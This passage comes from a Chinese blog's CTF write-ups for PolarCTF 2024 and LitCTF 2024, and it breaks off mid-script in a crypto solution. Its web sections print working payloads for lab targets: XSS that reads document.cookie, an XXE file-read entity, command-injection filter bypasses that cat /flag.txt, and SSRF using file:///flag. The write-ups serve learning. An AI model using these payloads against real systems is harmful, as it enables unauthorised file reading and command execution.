die(&quot;错误：必须设置正确参数。&quot;);<br>&#125;<br>?&gt;<br>错误：必须设置正确参数。<br></code></pre></td></tr></table></figure><p>先上源码，先审计一下代码，大体上应该就是关于md5的知识点</p><p>首先不能用数组绕过，然后要0e开头，最后md5加密后不能为数字，直接一把梭了，平时积累的md5加密等于自身就行</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%AE%A1%E8%AE%A1.png" alt="审计"></p><h2 id="扫扫看"><a href="#扫扫看" class="headerlink" title="扫扫看"></a>扫扫看</h2><p>提醒我们扫一下，用dirsearch扫一下得到flag.php,进去看看</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB.png" alt="扫"></p><p>看一下源码,得到flag</p><p><img src="/../../images/polarctf2024%E5%A4%8F/%E6%89%AB1.png" alt="扫1"></p><h2 id="debudao"><a href="#debudao" class="headerlink" title="debudao"></a>debudao</h2><p>内容，先看看源码，有个flag是假的（欸</p><p>尝试sql注入，好像也不是</p><p>尝试ssit注入，也不是</p><p>最后发现是xxe漏洞，这方面我还没怎么学，等暑假好好补补吧</p><p>先用下面的来测试一下，发现有弹窗</p><p><img src="/../../images/polarctf2024%E5%A4%8F/debudao.png" alt="debudao"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>然后跟着wp写的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/%E5%BE%97%E4%B8%8D%E5%88%B01.png" alt="得不到1"></p><p>爆出flag，用url解码就可以得到flag了</p><p>想法：按照这个方法的话其实好像可以直接用hackerbar看cookie那一栏，并不需要构造xxe，重新开一次容器发现方法并不可行，哈哈我自己想多了</p><h2 id="Dragon"><a href="#Dragon" class="headerlink" title="Dragon"></a>Dragon</h2><p>按照正常思路来走一遍，和上面的差不多但是都没有回显，最后得出也是xxe</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也是用这个得到的但是不能正常弹窗，和官p学习了一下可以用img</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(1)&gt;<br></code></pre></td></tr></table></figure><p>这样就可以正常的弹窗了，然后和上面的题目一样</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;img src=0 onerror =alert(document.cookie)&gt;<br></code></pre></td></tr></table></figure><p>获取cookie值，url解码得到flag</p><p>感想:任何比赛都能让人找到自己的不足漏洞，之后一定要狠狠学学。</p><h2 id="tnl"><a href="#tnl" class="headerlink" title="tnl"></a>tnl</h2><p>类型和前几题差不多，也试看看，尝试输入到3的时候会有报错，以为是sql注入，尝试万能语句并没有作用</p><p>也尝试了一下xxe也没有回显</p><p>用bp抓包看看，尝试利用伪协议得到index.php</p><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl.png" alt="tnl"></p><p>这是尝试过后发现源码应该后面本身就包含了.php，得到了源码，base64解密一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;/form&gt;<br>&lt;?php<br>error_reporting(0);<br>@$file = $_POST[&#x27;twothree&#x27;];<br><br>if(isset($file))<br>&#123;<br>if( strpos( $file, &quot;1&quot; ) !==  false || strpos( $file, &quot;2&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;<br>include ($file . &#x27;.php&#x27;);<br>&#125;<br>else&#123;<br>echo &quot;You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#x27;twothree&#x27;&#x27; at line 1&quot;;<br>&#125;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>看了源码可以得知这并不是sql注入，而是一个伪协议绕过的题目，输入1，2，index可以获得相应的内容</p><p>那么进行简单的构造，我也是第一次看到这种</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">twothree=php://filter/convert.base64-encode/index/resource=flag<br></code></pre></td></tr></table></figure><p><img src="/../../images/polarctf2024%E5%A4%8F/tnl1.png" alt="tnl1"></p><p>最后base64解密就可以得到flag了</p><h2 id="你知道sys还能这样玩吗"><a href="#你知道sys还能这样玩吗" class="headerlink" title="你知道sys还能这样玩吗"></a>你知道sys还能这样玩吗</h2><p>根据提示进入sys.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>;<br>    <span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|&#123;|&#125;|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget/i&#x27;</span>, <span class="hljs-variable">$cmd</span>)) &#123;<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>    &#125;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>和国赛的那个有点类似</p><h3 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h3><p>尝试php -r来进行二次执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(&quot;6c73202e2e2f&quot;));&#x27;</span><br></code></pre></td></tr></table></figure><p>查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=php -r <span class="hljs-string">&#x27;system(hex2bin(ff3b636174202f666c61672e747874));&#x27;</span><br></code></pre></td></tr></table></figure><p>ff是进行的一个绕过执行，否则得不到</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=`<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;Y2F0IC8q&quot;</span>|bas<span class="hljs-string">&quot;&quot;</span>e64 -d`<br></code></pre></td></tr></table></figure><p>这里看到一个师傅利用了printf和双引号绕过base64加密的方法得到了答案，也放在这，还是比较巧妙的</p><h3 id="方法3："><a href="#方法3：" class="headerlink" title="方法3："></a>方法3：</h3><p>上面几个都是借鉴的，还有一个办法就是八进制转化，之前写xyctf有一个和这样类似的，我就直接上payload了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd=$%27\143\141\164%27%3c$%27\57\146\154\141\147\56\164\170\164%27<br></code></pre></td></tr></table></figure><p>详情可参考，<a href="https://0ran9ewww.github.io/2024/04/26/XYCTFwp%E5%8F%8A%E4%B8%AA%E4%BA%BA%E5%A4%8D%E7%9B%98/">文章</a>，ezrce那个部分</p><h2 id="ExX"><a href="#ExX" class="headerlink" title="ExX?"></a>ExX?</h2><p>先搜看看flag{}有个假的flag，那再看看题目吧</p><p>尝试dirsearch扫描得到dom.php,出现了xml的报错很明显就是xxe的漏洞了，同天的lit比赛也是有一个题目是xxe</p><p>不知道原理直接上payload之后打算写一篇专题好好学习</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///var/www/html/flagggg.php&quot;</span> &gt;</span>]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>最后base64解密就行</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>剩下的题目都是考察java类的web题目，我还没学到也暂时没必要跟着复现了，总体来说题目也是较为友好的，自己还是要多复习多刷题，暂时就先到这了。</p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>xxe</tag>
      
      <tag>伪协议</tag>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Litctf2024</title>
    <link href="/2024/06/01/litctf2024/"/>
    <url>/2024/06/01/litctf2024/</url>
    
    <content type="html"><![CDATA[<p>前言：抽空写了一下挺适合新生的，但是复现环境一直没上，把中途写了的先放上面，如果后期上环境会写一下，要不然就咕了吧。</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="涐贪恋和伱、甾―⑺de毎兮毎秒"><a href="#涐贪恋和伱、甾―⑺de毎兮毎秒" class="headerlink" title="涐贪恋和伱、甾―⑺dé毎兮毎秒"></a>涐贪恋和伱、甾―⑺dé毎兮毎秒</h2><p>下载图片，尝试改宽高，binwalk无果，steg看看，调成000就出来了</p><p><img src="/../images/litctf2024/%E6%AF%8F%E5%88%86%E6%AF%8F%E7%A7%92.png" alt="每分每秒"></p><h2 id="你说得对，但"><a href="#你说得对，但" class="headerlink" title="你说得对，但__"></a>你说得对，但__</h2><p>下载扫一下，进入云原神，foremost得到四张图拼一下得到二维码</p><p>在word里面就可以</p><p><img src="/../images/litctf2024/%E4%BD%86%E6%98%AF.png" alt="但是"></p><p>扫一下得到flag</p><h2 id="原铁，启动！"><a href="#原铁，启动！" class="headerlink" title="原铁，启动！"></a>原铁，启动！</h2><p>类似flag的特殊文字，以前写过类似的</p><p>放图片对照</p><p><img src="/../images/litctf2024/%E5%8E%9F%E7%A5%9E.jpeg" alt="原神"></p><p><img src="/../images/litctf2024/%E5%B4%A9%E9%93%81.png" alt="崩铁"></p><p>flag{good_gamer}</p><h2 id="盯帧珍珠"><a href="#盯帧珍珠" class="headerlink" title="盯帧珍珠"></a>盯帧珍珠</h2><p>010看一下是gif改一下，写个脚本出截图</p><img src="/../images/litctf2024/frame_7.png" alt="frame_7" style="zoom:25%;"><img src="/../images/litctf2024/frame_21.png" alt="frame_21" style="zoom:25%;"><img src="/../images/litctf2024/frame_31.png" alt="frame_31" style="zoom:25%;"><img src="/../images/litctf2024/frame_55.png" alt="frame_55" style="zoom:25%;"><h2 id="Everywhere-We-Go"><a href="#Everywhere-We-Go" class="headerlink" title="Everywhere We Go"></a>Everywhere We Go</h2><p>下载得到MP3</p><p>用aud看一下找到flag</p><p><img src="/../images/litctf2024/where.png" alt="where"></p><h2 id="舔到最后应有尽有"><a href="#舔到最后应有尽有" class="headerlink" title="舔到最后应有尽有"></a>舔到最后应有尽有</h2><p>密文，看着眼熟一把梭</p><p><img src="/../images/litctf2024/%E8%88%94.png" alt="舔"></p><h2 id="关键，太关键了"><a href="#关键，太关键了" class="headerlink" title="关键，太关键了!"></a>关键，太关键了!</h2><p>jetnta{e_kess_ymu_imss}</p><p>猜测前面对应的是litctf，后面估计就是i_miss_you_什么,写个代码看出现词频</p><p>得到为b，最后为boss</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SAS-Serializing-Authentication-System"><a href="#SAS-Serializing-Authentication-System" class="headerlink" title="SAS - Serializing Authentication System"></a>SAS - Serializing Authentication System</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;secure_password&#x27;</span>);<br><br><span class="hljs-comment">// 序列化并编码对象</span><br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><br></code></pre></td></tr></table></figure><p>Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE1OiJzZWN1cmVfcGFzc3dvcmQiO30&#x3D;</p><p>得到答案</p><h2 id="exx"><a href="#exx" class="headerlink" title="exx"></a>exx</h2><p>xxe构造，bp发包</p><p><img src="/../images/litctf2024/exx.png" alt="exx"></p><h2 id="一个…-池子？"><a href="#一个…-池子？" class="headerlink" title="一个….池子？"></a>一个….池子？</h2><p>测试为ssit,fenjing一把梭</p><p><img src="/../images/litctf2024/%E6%B1%A0%E5%AD%90.png" alt="池子"></p><h2 id="浏览器也能套娃？"><a href="#浏览器也能套娃？" class="headerlink" title="浏览器也能套娃？"></a>浏览器也能套娃？</h2><p>这题的话考察的是ssrf，这方面类型的题目之前没写过，相关的知识点也不太清楚。</p><p>先随机尝试看看</p><p><img src="/../images/litctf2024/%E5%A5%971.png" alt="套1"></p><p>正常输入网站是可以的，尝试输入其他的看看</p><p><img src="/../images/litctf2024/%E5%A5%972.png" alt="套2"></p><p>明显是ssrf，尝试绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">file:///flag<br></code></pre></td></tr></table></figure><p>或者用伪协议绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php://filter/resource=/flag<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="高亮主题-划掉-背景查看器"><a href="#高亮主题-划掉-背景查看器" class="headerlink" title="高亮主题(划掉)背景查看器"></a>高亮主题(划掉)背景查看器</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// 文件包含漏洞演示</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>])) &#123;<br><br>    <span class="hljs-comment">// 读取并包含用户输入的文件</span><br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$file</span>, <span class="hljs-string">&#x27;..&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br><br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Access denied.&quot;</span>;<br><br>    &#125;<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No file specified.&quot;</span>;<br><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>看着像文件包含啊，匹配是否有..，试了一会没出，抓个包看看</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF.png" alt="背景"></p><p>给theme输入flag,会有报错回显，那估计就是通过这个来具体在那一层需要挨个试</p><p><img src="/../images/litctf2024/%E8%83%8C%E6%99%AF1.png" alt="背景1"></p><p>得到flag</p><h2 id="百万美元的诱惑"><a href="#百万美元的诱惑" class="headerlink" title="百万美元的诱惑"></a>百万美元的诱惑</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-variable">$b</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>];<br><br><span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> !== <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$a</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$b</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$c</span>) &amp;&amp; <span class="hljs-variable">$c</span> &gt; <span class="hljs-number">2024</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;好康的&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;干巴爹干巴爹先辈~&quot;</span>);<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;开胃小菜))&quot;</span>);<br>&#125;<br>开胃小菜))<br></code></pre></td></tr></table></figure><p>简单的分析一下传三个值，a和b是个很常规的MD5弱比教，c是利用php的特性就可以绕过</p><p><strong>方法1</strong>：数组绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a[]=1&amp;b[]=2&amp;c=2025a<br></code></pre></td></tr></table></figure><p><strong>方法2</strong>：积累字符串</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?a=s878926199a&amp;b=s155964671a&amp;c=2025a<br></code></pre></td></tr></table></figure><p>跳到第二页面</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//flag in 12.php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$x</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z0-9;`|#&#x27;\&quot;%&amp;\x09\x0a&gt;&lt;.,?*\-=\\[\]]/i&quot;</span>, <span class="hljs-variable">$x</span>))&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;cat &quot;</span>.<span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;.php&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>很常见的无字母数字绕过，只要构造12就可以了</p><p>我尝试了异或和自反失败了，应该用的是linux的特性构造自增</p><p>可以看看这篇文章，好多题这篇都可以解决</p><p><a href="https://xz.aliyun.com/t/12242?time__1311=mqmhD5YIMD7GkDlc+EvPQT47qgxAxAIwxx&alichlgref=https://cn.bing.com/#toc-0">文章</a>，按照图片然后往后加就行</p><p><img src="/../images/litctf2024/dollar.png" alt="dollar"></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><p>最后看一下源码得到flag</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="small-e"><a href="#small-e" class="headerlink" title="small_e"></a>small_e</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br>n = <span class="hljs-number">19041138093915757361446596917618836424321232810490087445558083446664894622882726613154205435993358657711781275735559409274819618824173042980556986038895407758062549819608054613307399838408867855623647751322414190174111523595370113664729594420259754806834656490417292174994337683676504327493103018506242963063671315605427867054873507720342850038307517016687659435974562024973531717274759193577450556292821410388268243304996720337394829726453680432751092955575512372582624694709289019402908986429709116441544332327738968785428501665254894444651547623008530708343210644814773933974042816703834571427534684321229977525229</span><br>c_list = [<span class="hljs-number">438976</span>, <span class="hljs-number">1157625</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">300763</span>, <span class="hljs-number">592704</span>, <span class="hljs-number">343000</span>, <span class="hljs-number">1860867</span>, <span class="hljs-number">1771561</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1225043</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1685159</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1295029</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1030301</span>, <span class="hljs-number">1442897</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">140608</span>, <span class="hljs-number">1259712</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">970299</span>, <span class="hljs-number">1601613</span>, <span class="hljs-number">941192</span>, <span class="hljs-number">132651</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1481544</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1367631</span>, <span class="hljs-number">1560896</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">110592</span>, <span class="hljs-number">1061208</span>, <span class="hljs-number">857375</span>, <span class="hljs-number">1331000</span>, <span class="hljs-number">1953125</span>]<br><br>flag = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> c_list:<br>    m, exact = gmpy2.iroot(c, <span class="hljs-number">3</span>)  <span class="hljs-comment"># 求立方根</span><br>    <span class="hljs-keyword">if</span> exact:<br>        flag += long_to_bytes(m).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密失败，密文可能过大或不是精确的立方&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br><br></code></pre></td></tr></table></figure><h2 id="common-primes"><a href="#common-primes" class="headerlink" title="common_primes"></a>common_primes</h2><p>gpt一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes, inverse, GCD<br><span class="hljs-keyword">import</span> gmpy2<br><br><span class="hljs-comment"># Given values</span><br>n1 = <span class="hljs-number">63306931765261881888912008095340470978772999620205174857271016152744820165330787864800482852578992473814976781143226630412780924144266471891939661312715157811674817013479316983665960087664430205713509995750877665395721635625035356901765881750073584848176491668327836527294900831898083545883834181689919776769</span><br>n2 = <span class="hljs-number">73890412251808619164803968217212494551414786402702497903464017254263780569629065810640215252722102084753519255771619560056118922616964068426636691565703046691711267156442562144139650728482437040380743352597966331370286795249123105338283013032779352474246753386108510685224781299865560425114568893879804036573</span><br>c1 = <span class="hljs-number">11273036722994861938281568979042367628277071611591846129102291159440871997302324919023708593105900105417528793646809809850626919594099479505740175853342947734943586940152981298688146019253712344529086852083823837309492466840942593843720630113494974454498664328412122979195932862028821524725158358036734514252</span><br>c2 = <span 